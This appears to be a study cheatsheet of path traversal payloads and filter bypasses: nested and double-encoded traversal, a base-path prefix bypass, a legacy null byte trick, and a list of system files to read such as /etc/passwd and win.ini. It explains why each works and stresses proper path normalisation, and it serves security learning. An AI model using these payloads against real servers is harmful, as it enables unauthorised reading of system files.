# Payloads and Bypasses Cheatsheet

## Common payload patterns

| Situation | Payload idea | Example | Why it works |
|---|---|---|---|
| Basic traversal | Go up directories | `../../../etc/passwd` | Escapes the base directory |
| Absolute path accepted | Use full path | `/etc/passwd` | No traversal sequence is needed |
| `../` stripped once | Nested traversal | `....//....//etc/passwd` | Weak filtering can create `../` after stripping |
| URL encoding | Encode traversal characters | `%2e%2e%2f` | Bypasses filters that inspect raw input |
| Double encoding | Encode `%` itself | `..%252f..%252fetc%252fpasswd` | First decode gives `%2f`, second decode gives `/` |
| Required base path | Start with allowed path, then escape | `/var/www/images/../../../etc/passwd` | Passes weak prefix validation |
| Appended extension | Null byte, old PHP only | `../../etc/passwd%00` | Historically truncated an appended suffix such as `.php` |

## Basic traversal

```txt
../../../etc/passwd
```

This moves up directories until the path can reach `/etc/passwd`.

## Common target files by operating system

| OS | Common test file | Why it is useful |
|---|---|---|
| Linux | `/etc/passwd` | Usually exists, often readable and easy to recognise |
| Linux | `/etc/hosts` | Usually readable and confirms local file read |
| Linux | `/proc/version` | Can reveal kernel/version information |
| Linux | `/etc/issue` | Can reveal OS/banner information |
| Windows | `C:\Windows\win.ini` | Classic Windows file disclosure test |
| Windows | `C:\boot.ini` | Older Windows boot configuration file |
| Windows | `C:\Windows\System32\drivers\etc\hosts` | Windows hosts file |

## Absolute path

```txt
/etc/passwd
```

No traversal is needed if the backend accepts full filesystem paths.

## Nested traversal

```txt
....//....//....//etc/passwd
```

This may bypass filters that remove `../` only once.

Conceptually:

```txt
....// -> after weak stripping -> ../
```

The key lesson is that non-recursive string replacement is not a reliable defence.

## URL encoding

```txt
../ -> %2e%2e%2f
```

Some filters look for raw `../`, but the application or framework may decode the input later.

## Double URL encoding

```txt
%252f -> %2f -> /
```

Example:

```txt
..%252f..%252f..%252fetc%252fpasswd
```

After first decode:

```txt
..%2f..%2f..%2fetc%2fpasswd
```

After second decode:

```txt
../../../etc/passwd
```

Double encoding can hide traversal from an earlier validation layer if the application decodes input again later.

## Required base path bypass

If an application requires the input to start with:

```txt
/var/www/images/
```

a weak check may be bypassed with:

```txt
/var/www/images/../../../etc/passwd
```

The raw input starts with the expected path, but the final resolved path can escape the directory.

## Appended extension bypass

If the application appends an extension:

```php
include($_GET["file"] . ".php");
```

then this:

```txt
../../../../etc/passwd
```

may become:

```txt
../../../../etc/passwd.php
```

In old PHP versions, null byte `%00` could sometimes terminate the path before the appended extension:

```txt
../../../../etc/passwd%00
```

This is a historical bypass and should not be expected to work in modern PHP.

## Note to self

Payloads mostly prove one question: did the backend normalize and check the real file path before reading it?
